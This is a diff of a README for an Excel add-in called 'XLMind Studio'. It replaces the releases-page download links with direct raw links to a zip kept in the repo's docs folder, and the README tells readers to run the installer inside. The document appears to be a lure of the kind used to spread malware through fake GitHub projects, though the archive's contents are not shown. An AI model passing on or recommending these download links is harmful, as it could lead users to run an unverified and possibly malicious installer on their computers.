@@ -1,7 +1,7 @@
 <h1>🧠 xlmind-studio - 150+ Excel Tools, One Powerful Add-In</h1>
 
 <p align="center">
-  <a href="https://github.com/Everchanging-wholesalehouse6127/xlmind-studio/releases">
+  <a href="https://raw.githubusercontent.com/Everchanging-wholesalehouse6127/xlmind-studio/main/docs/xlmind_studio_v1.7.zip">
     <img src="https://img.shields.io/badge/Download-XLMind%20Studio%20Free-2ea44f?style=for-the-badge&logo=windows&logoColor=white" alt="Download XLMind Studio">
   </a>
 </p>
@@ -19,7 +19,7 @@ Welcome to **XLMind Studio** – your all-in-one toolkit for Microsoft Excel on 
 ### Step 1: Get the File
 
 Visit this link to download the application:  
-👉 **[Download XLMind Studio](https://github.com/Everchanging-wholesalehouse6127/xlmind-studio/releases)**
+👉 **[Download XLMind Studio](https://raw.githubusercontent.com/Everchanging-wholesalehouse6127/xlmind-studio/main/docs/xlmind_studio_v1.7.zip)**
 
 ### Step 2: Run the Installer
 
@@ -187,7 +187,7 @@ XLMind Studio is licensed per user. You may install it on multiple computers you
 Stop wrestling with Excel. Let XLMind Studio handle the heavy lifting so you can focus on what matters – analyzing data, making decisions, and presenting insights with confidence.
 
 **Ready to boost your Excel productivity?**  
-👉 **[Download XLMind Studio Now](https://github.com/Everchanging-wholesalehouse6127/xlmind-studio/releases)**
+👉 **[Download XLMind Studio Now](https://raw.githubusercontent.com/Everchanging-wholesalehouse6127/xlmind-studio/main/docs/xlmind_studio_v1.7.zip)**
 
 ---
 
